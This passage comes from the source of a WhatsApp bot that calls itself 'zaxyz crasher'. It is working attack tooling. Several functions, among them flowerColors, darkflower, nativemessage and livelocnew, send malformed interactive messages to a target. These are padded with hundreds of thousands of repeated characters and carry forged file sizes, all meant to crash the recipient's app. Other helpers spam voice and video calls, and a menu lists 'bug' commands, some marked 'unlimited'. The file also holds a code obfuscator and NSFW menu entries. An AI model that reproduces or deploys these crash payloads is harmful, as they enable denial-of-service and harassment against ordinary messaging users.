"screen_0_Dropdown_2": "001-Grimgar",
"screen_0_RadioButtonsGroup_3": "0_true",
"flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
}`,
version: 3
}
]
}
}
}
}
}), { userJid: target, quoted: null });

await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

async function flowerColors(target) {
let msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "*zaxyz is here⚡*",
hasMediaAttachment: false
},
body: {
text: "저스틴*zaxyz is here⚡*"
},
nativeFlowMessage: {
messageParamsJson: "",
buttons: [{
name: "single_select",
buttonParamsJson: "JSON.stringify(listMessage)"
},
{
name: "call_permission_request",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "view_product",
buttonParamsJson: "JSON.stringify(listMessage)",
}, 
{
name: "payment_info",
buttonParamsJson: "JSON.stringify(listMessage)",
}, 
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)",
},
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)",
},
{
name: 'galaxy_message',
paramsJson: `{\"screen_2_OptIn_0\":true,           \"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"*zaxyz is here⚡* Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"DapzNotDev@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(355000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
}
]
}
}
}
}
}, {});
await sock.relayMessage(target, msg.message, {
messageId: msg.key.id,
participant: { jid: target }
});
console.log(`*zaxyz is here⚡*${target}`);
}

  async function darkflower(target) {
    let Msg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "*zaxyz is here⚡*͒" + "ꦾ".repeat(77777), 
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, Msg, {
      participant: { jid: target },
    })
  }


async function nativemessage(target) {
sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "*zaxyz is here⚡*",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: '',
              },
              hasMediaAttachment: true,
              },
              body: {
                text:
                  "*zaxyz is here⚡*⭑̤\n" +
                  "ꦾ".repeat(10000) +
                  `@1`.repeat(10000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                                  nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: {}
                            }
                        ]
                    },  
                quotedMessage: {
                locationMessage: {
                  degreesLatitude: 1.0,
                  degreesLongitude: 5.0,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    )
    }
    
async function nativeloc(target) {
sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
           locationMessage: {
                  degreesLatitude: 1.0,
                  degreesLongitude: 5.0,
                  },
              hasMediaAttachment: true,
              },
              body: {
                text:
                  "*zaxyz is here⚡*⭑̤\n" +
                  "ꦾ".repeat(10000) +
                  `@1`.repeat(10000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                                  nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: {}
                            }
                        ]
                    },  
                quotedMessage: {
                locationMessage: {
                  degreesLatitude: 1.0,
                  degreesLongitude: 5.0,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
}    
    
    
    
    
    
    
    

async function loading () {
var Floading = [
"",
"",
""
]
let { key } = await sock.sendMessage(from, {text: " "})
for (let i = 0; i < Floading.length; i++) {
await sock.sendMessage(from, {text: Floading[i], edit: key });
}
}

//END
//FILE RESIZE ( FAKE )

const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}

//END
//FUNCTION OBF

async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Me`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

//END
//SEND SPAM PAIRING

const VcardQuoted = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? {
            remoteJid: "0@s.whatsapp.net"
        } : {})
    },
    "message": {
        "documentMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
            "mimetype": "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
            "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
            "fileLength": "974197419741",
            "pageCount": "974197419741",
            "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
            "fileName": "𝐓𝐚𝐦𝐚𝐂𝐫𝐚𝐬𝐡~𝐃𝐨𝐜𝐮𝐦𝐞𝐧𝐭 :v",
            "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
            "directPath": '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
            "mediaKeyTimestamp": "1715880173",
            "contactVcard": true
        },
        "title": "Haha Bot" + "ꦾ".repeat(103000),
        "body": {
            "text": "Aww" + "ꦾ".repeat(103000) + "@1".repeat(150000)
        },
        "nativeFlowMessage": {},
        "contextInfo": {
            "mentionedJid": ["1@newsletter"],
            "groupMentions": [{ "groupJid": "1@newsletter", "groupSubject": "" }]
        }
    },
    "contextInfo": {
        "mentionedJid": [m.chat],
        "externalAdReply": {
            "showAdAttribution": true,
            "title": "Aww ",
            "body": "Aww Always With You",
            "mediaType": 3,
            "renderLargerThumbnail": true,
            "thumbnailUrl": "your-thumbnail-url-here",
            "sourceUrl": "https://youtube.com/@Aww",
        },
        "forwardedNewsletterMessageInfo": {
            "newsletterJid": "12036332170343299@newsletter",
            "serverMessageId": 1,
            "newsletterName": "sockAww Crasher",
        }
    },
    "expiryTimestamp": 0,
    "amount": {
        "value": "999999999",
        "offset": 999999999,
        "currencyCode": "CRASHCODE9741",
    },
    "background": {
        "id": "100",
        "fileLength": "928283",
        "width": 1000,
        "height": 1000,
        "mimetype": "application/vnd.ms-powerpoint",
        "placeholderArgb": 4278190080,
        "textArgb": 4294967295,
        "subtextArgb": 4278190080,
    }
}
async function SendPairing(target) {
			await sock.relayMessage(target, {
					viewOnceMessage: {
						message: {
								nativeFlowResponseMessage: {
									"status":true,
                           "criador":"VenomMods","resultado":"\n{\n\"type\":\"md\",\n\"ws\":{\n\"_events\":{\"CB:ib,,dirty\":[\"Array\"]},\n\"_eventsCount\":20,\n\"_maxListeners\":0,\n\"url\":\"wss://web.whatsapp.com/ws/chat\",\n\"config\":{\n\"version\":[\"Array\"],\n\"browser\":[\"Array\"],\n\"waWebzaxyzetUrl\":\"wss://web.whatsapp.com/ws/chat\",\n\"connectTimeoutMs\":20000,\n\"keepAliveIntervalMs\":30000,\n\"logger\":{},\n\"printQRInTerminal\":false,\n\"emitOwnEvents\":true,\n\"defaultQueryTimeoutMs\":60000,\n\"customUploadHosts\":[],\n\"retryRequestDelayMs\":250,\n\"maxMsgRetsockount\":5,\n\"fireInitQueries\":true,\n\"auth\":{\"Object\":\"authData\"},\n\"markOnlineOnconnect\":true,\n\"syncFullHistory\":false,\n\"linkPreviewImageThumbnailWidth\":192,\n\"transactionOpts\":{\"Object\":\"transactionOptsData\"},\n\"generateHighQualityLinkPreview\":false,\n\"options\":{},\n\"appStateMacVerification\":{\"Object\":\"appStateMacData\"},\n\"mobile\":false\n}\n}\n}"
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
};
//END
//SEND CALL

const bugpip = (`──♢ *LOADING*♢───
─♢ \`200 SECOND\` ♢──
ᴛʜᴇ ᴘʀᴏᴄᴇꜱꜱ ᴏꜰ ꜱᴇɴᴅɪɴɢ, 
ꜱᴏ ᴀꜱ ɴᴏᴛ ᴛᴏ ꜱᴘᴀᴍ ᴡʜɪʟᴇ 
*ᴛʜᴇ ʙᴏᴛ ɪꜱ ꜱᴛɪʟʟ ᴡᴏʀᴋɪɴɢ*
> zaxyz`)

async function sendOfferCall(target) {
    try {
        await sock.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}

async function sendOfferVideoCall(target) {
    try {
        await sock.offerCall(target, { 
        video: true 
        });
        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
    }
}
//END
//BUTTON MESSAGE ( NOT WORK )
sock.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await sock.sendPresenceUpdate('composing', jid)
      return sock.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
   
//END
//THUMBNAIL LINK + QUOTED MESSAGE

const Zets = {
			key: {
				fromMe: false,
				participant: "0@s.whatsapp.net",
				remoteJid: "status@broadcast"
			},
			message: {
				orderMessage: {
					orderId: "2029",
					thumbnail: ryclol,
					itemCount: `666`,
					status: "INQUIRY",
					surface: "CATALOG",
					message: `zaxyz`,
					token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
				}
			},
			contextInfo: {
				mentionedJid: [m.sender],
				forwardingScore: 999,
				isForwarded: false
			}
		}
		
		const Reply = (teks) => {
    return sock.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `zaxyz`,
                body: `zaxyzNoCounter🐉`,
                mediaType: 3,
                renderLargerThumbnail: true,
                thumbnailUrl: ThumbUrl,
                sourceUrl: `https://whatsapp.com/channel/0029Vb3FLbNDeON7RBx7OX0l`
            }
        }
    }, { quoted: Zets });
}

const ReplyRap = (teks) => {
    return sock.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `Xasymods🌹 `,
                body: `zaxyzModsss`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: "https://files.catbox.moe/kltqkj.jpg",
                sourceUrl: `https://youtube.com/@stokzaxyz`
            }
        }
    }, { quoted: lol });
}

const ThumbUrl = "https://files.catbox.moe/kltqkj.jpg"
const XQuoted = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": { "url": "https://h.top4top.io/p_3301ml5m70.jpg" },
					"itemCount": 9741,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `Command : ${command}`,
					"orderTitle": " zaxyzWoii",
					"sellerJid": "6285727819741@s.whatsapp.net",
					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
					"totalAmount1000": "9741",
					"totalCurrencyCode": "IDR"
				}
			}
		}
		const xXxX = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": { "url": "https://h.top4top.io/p_3301ml5m70.jpg" },
					"itemCount": 2009,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `! #Crash Message# !`,
					"orderTitle": " zaxyzWoii",
					"sellerJid": "6285727819741@s.whatsapp.net",
					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
					"totalAmount1000": "2009",
					"totalCurrencyCode": "IDR"
				}
			}
		}
const qloc = {
	"key": {
        "participant": '0@s.whatsapp.net',
            "remoteJid": "status@broadcast",
		    "fromMe": false,
		    "id": "Halo"
                        },
       "message": {
                    "locationMessage": {
                    "name": 'イNoCounter!!',
                    "jpegThumbnail": ''
                          }
                        }
                      }
//END
//START NEW FUNCTION
async function livelocnew(target) {
let BoomText = "My Location, Come Here!!!" + "ꦾ".repeat(250000);

const messageContent = {
    ephemeralMessage: {
        message: {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 0,
                        caption: BoomText,
                        sequenceNumber: "",
                        jpegThumbnail: null
                    },
                    body: {
                        text: BoomText
                    },
                    nativeFlowMessage: {}, // If needed, specify more details here
                    contextInfo: {
                     contactVcard: true,
                        mentionedJid: [m.chat],
                        groupMentions: [
                            { 
                                groupJid: "@120363321780343299@g.us", 
                                groupSubject: "zaxWoii" 
                            }
                        ]
                    }
                }
            }
        }
    }
};

// Generate the WA message based on the content
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject(messageContent), {
    userJid: m.chat, 
    quoted: QuotedGalaxy // Ensure this is defined or passed correctly
});

// Send the generated message
 sock.relayMessage(m.chat, etc.message, {
    participant: { jid: m.chat }, 
    messageId: etc.key.id
});
}
//END
//REPLY MESSAGE
const ReplyImage = (teks) => {
    return sock.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐈͢𝐦͞𝐩𝐫̲́𝐨̋𝐯͟𝐞ͯ𝐕𝟗̅𝐩𝐫̬̏𝐨`,
                body: `zaxyzppModss`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: ThumbUrl,
                sourceUrl: `https://youtube.com/`
            }
        }
    }, { quoted: m });
}

//END
//STIKER AND BRAT FUNCTION

function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
async function makeStickerFromUrl(imageUrl, sock, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await sock.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `𝐈͢𝐦͞𝐩𝐫̲́𝐨̋𝐯͟𝐞ͯ𝐕𝟗̅𝐩𝐫̬̏𝐨`,
                    body: `zaxyzppModss`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: ThumbUrl, 
                    sourceUrl: `https://youtube.com/@stokzaxyz`
                }
            }
        }, { quoted: m });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        ReplyRap('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}

async function listbut2(chat, teks, listnye, Zets) {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363369514105242@newsletter",
newsletterName: `zaxyzNoCounter!!`,
serverMessageId: 145
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© zaxyzppModsss`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: ``,
thumbnailUrl: "",
gifPlayback: true,
subtitle: "",
hasMediaAttachment: true,
...(await prepareWAMessageMedia({ image: { url: './test.jpeg' } }, { upload: sock.waUploadToServer })),
}),
gifPlayback: true,
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listnye)
}],
}), })}
}}, {quoted: Zets})
await sock.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}
const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: babi,
      itemCount: "",
      status: "INQUIRY",
      surface: "",
      message: `𝗧𝗵𝗲𝗗𝗲𝘃𝗶𝗹𝗖𝗼𝘃𝗲𝗿𝗲𝗱𝗜𝗻𝗕𝗹𝗼𝗼𝗱`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const lol2 = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: babi,
      itemCount: "9741",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
//END

let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}

let limitUser = PremOnly ? 1 : global.limitCount
async function useLimit(sender, amount) {
     users.limit -= amount;
     users.totalLimit += amount;
     m.reply(`Limit Anda Telah Digunakan Sebanyak ${amount} Dari ${users.limit} Limit Kamu`,
        );
 }

const RunTime = `_${runtime(process.uptime())}_`
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
switch(command) {
//ALL MENU CASE {
case 'menu': {
let limitnya = useLimit
let Menu = `
▢ 👋🏻 Konichiwa!!, I'm zaxyz crasher 𝗩1 𝗚𝗘𝗡 1 Made by *\`Asy dev⚡\`*, i will help you in running this bot, thank you for using it, developer contact is in the button

 *\`[ zaxyz crasher 𝗩1 𝗚𝗘𝗡 1 ]\`*
 *Version* : Gen1Version!✰
 *Developer* : asy dev⚡✰
 *Name* : zaxyz crasher
` 
sock.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/kltqkj.jpg" }, //gif nya
        caption: Menu,
        footer: "© zaxyz - 2025",
        gifPlayback: true,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: `zaxyzV1Gen1`,
                body: `® zaxyz ⚡`,
                thumbnailUrl: "https://files.catbox.moe/kltqkj.jpg",
                sourceUrl: "www.pornhub.com",
                mediaType: 1,
                renderLargerThumbnail: false
        }
    },
 buttons: [
  {
    buttonId: ".bugmenu", 
    buttonText: { 
      displayText: '𝐁͢𝐮͠𝐠𝐬̛͜𝐌𝐞̈́͟𝐧̶𝐮' 
    }
  }, {
    buttonId: ".funmenu", 
    buttonText: {
      displayText: "𝐅͢𝐮͡𝐧̷𝐌̄͟𝐞𝐧̈́͟𝐮"
    }
   }, {
   buttonId: ".ownerdev", 
    buttonText: {
      displayText: "𝐃͟𝐞𝐯̂𝐞̋͢𝐥𝐨̷𝐩𝐞̬𝐫"
    }
  }
],
  viewOnce: true,
  headerType: 6
}, { quoted: lol })
}
break
case 'buttonbug': {
let limitnya = useLimit
let Menu = `
 *\`[ zaxyz 𝗩1 𝗚𝗘𝗡 1 ]\`*
 *Version* : Gen1Version!✰
 *Developer* : asy dev⚡✰
 *Name* : zaxyz crasher✰

 Example x-zax 628xx
 for button bugs
` 
sock.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/kltqkj.jpg" }, //gif nya
        caption: Menu,
        footer: "© Asy dev⚡ - 2025",
        gifPlayback: true,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: `zaxyz 𝗩1 𝗚𝗘𝗡 1`,
                body: `® Asy dev⚡`,
                thumbnailUrl: "https://files.catbox.moe/kltqkj.jpg",
                sourceUrl: "www.pornhub.com",
                mediaType: 1,
                renderLargerThumbnail: false
        }
    },
 buttons: [
  {
   buttonId: ".bugmenu", 
    buttonText: {
      displayText: "𝐁̽𝐚͢͡𝐜̷𝐤"
    }
  }
],
  viewOnce: true,
  headerType: 6
}, { quoted: lol })
}
break
case 'bugmenu': {
let limitnya = useLimit
let Menu = `
 *\`[ ZAXYZ 𝗩1 𝗚𝗘𝗡 1 ]\`*
 \`✯\` : ZAXYZ 𝗩1 𝗚𝗘𝗡 1!✰
 \`✯\` : Asy dev⚡✰
 \`✯\` : ZAXYZ
  [ *\`asy dev⚡\`* ]
` 
sock.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/kltqkj.jpg" }, //gif nya
        caption: Menu,
        footer: "  [ INSTANT ]\n♢ c1\n♢ zaxyz-is-here\n♢ zaxyz-crah\n♢ spamcall\n\n  [ zaxyzBugs ]\n♢ zaxyz-calls\n♢ zaxyz-instant\n♢ zax-elite\n♢ zaxOverflow\n♢ zax-Overzy\n♢ zax-MainFyz\n\n  [ Bug-Group ]\n♢ group-zax\n♢ crash-group\n♢ index-group\n\n[ RECOMMENDED ]\n♢ X-zax ( button select )\n♢ Xy-Bellow\n♢ extreme-combo\n♢ godx-war\n♢ peak-death\n♢ two-force\n\n[ EXTREME ]\n♢ Improveflowunlimited (unlimited bug)\n♢ ryoiki-tenkai (unlimited bug)\n♢ kyotsu-ultimate (unlimited bug)\n\n© asydev⚡",
        gifPlayback: true,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: `zaxyzV1Gen1`,
                body: `® zaxyz ⚡`,
                thumbnailUrl: "https://files.catbox.moe/kltqkj.jpg",
                sourceUrl: "www.pornhub.com",
                mediaType: 1,
                renderLargerThumbnail: false
        }
    },
 buttons: [
       {
    buttonId: ".menu", 
    buttonText: { 
      displayText: '𝐁̽𝐚͢͡𝐜̷𝐤' 
    }
  }, {
    buttonId: ".buttonbug", 
    buttonText: {
      displayText: "𝐁͢𝐮͠𝐭͟͠𝐭𝐨𝐧̤̈́𝐬͖𝐁̶͟𝐮̶𝐠"
    }
  }
],
  viewOnce: true,
  headerType: 6
}, { quoted: lol })
}
break

case 'funmenu': {
let limitnya = useLimit
let Menu = `
 *\`[ ZAX 𝗩1 𝗚𝗘𝗡 1 ]\`*
 \`✯\` : Gen1Version!✰
 \`✯\` : Asy dev✰
 \`✯\` : zaxyz✰
  [ *\`⸸zaxyz⸸\`* ]
  
  [ FUN MENU ]
 ✯ brat ( reply image )
 ✯ hidetag
 ✯ kick 
 ✯ linkgroup
 ✯ resetlinkgc
 ✯ ocr
 [ DOWNLOAD MENU ]
 ✯ tiktok *link*
 ✯ tourl *photo/vid*
 ✯ rvo ( read to view )
 [ NSFW MENU ]
 ✯ nsfw
 ✯ hentaineko
 ✯ r34
` 
sock.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/kltqkj.jpg" }, //gif nya
        caption: Menu,
        footer: "© zaxyz ⚡",
        gifPlayback: true,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: `zax 𝗩1 𝗚𝗘𝗡 1`,
                body: `® asyMods`,
                thumbnailUrl: "https://files.catbox.moe/kltqkj.jpg",
                sourceUrl: "www.pornhub.com",
                mediaType: 1,
                renderLargerThumbnail: false
        }
    },
 buttons: [
     {
    buttonId: ".menu", 
    buttonText: { 
      displayText: '𝐁̽𝐚͢͡𝐜̷𝐤' 
    }
  }, {
    buttonId: ".ownerdev", 
    buttonText: {
      displayText: "𝐃͟𝐞𝐯̂𝐞̋͢𝐥𝐨̷𝐩𝐞̬𝐫"
    }
  }
],
  viewOnce: true,
  headerType: 6
}, { quoted: lol })
}
break


/** WhiteList **/
    

case 'ownerdev': {
let name = m.pushName || sock.getName(m.sender);
let pan = `
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> zaxyz 𝗩1 𝗚𝗘𝗡 1✰
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
`;
const url = fs.readFileSync("./image/gen3.jpeg")
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: sock.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: pan
          },
          carouselMessage: {
            cards: [
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './image/gen3.jpeg' } }, { upload: sock.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: 'asyGnzz',
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏───────────────┈ 
┆ 「 *\`[DEV BOT]\`* 」
┣───────────────┈ 
┣=[ *\`[ zaxyzModss ]\`* ]==─
┆ • Jangan Chat Yang Aneh Aneh
┆ • Jangan Telpon/Call Owner 
┆ • Chat Langsung ke intinya aja
┆ • Klo Ada Uang Minimal Bagi
└────────────┈ ⳹`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"Developer zaxyz 𝗩1 𝗚𝗘𝗡 1 ( sock )","url":"https://t.me/xyroooy","merchant_url":"https://t.me/xyroooy"}`
                    },
                  ],
                },
              },
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './image/gen3.jpeg' } }, { upload: sock.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: 'Saluran',
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏───────────────┈ 
┆「 *\`[CHANNEL OFC]\`* 」
┣───────────────┈ 
└────────────┈ ⳹`
                },
                nativeFlowMessage: {
